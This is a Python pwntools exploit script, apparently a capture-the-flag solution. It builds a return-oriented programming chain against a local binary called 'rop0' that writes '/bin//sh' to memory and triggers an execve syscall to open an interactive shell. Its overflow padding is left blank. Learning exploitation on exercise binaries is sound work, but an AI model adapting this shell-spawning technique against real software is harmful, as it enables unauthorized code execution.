from pwn import *
from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x0000000000401637) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401637) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004260ef) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401516) # pop rdi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000401637) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004428e6) # pop rdx ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004260ef) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
p += pack('<Q', 0x00000000004003da) # syscall

r = process('rop0')
r.send(p)
r.interactive()
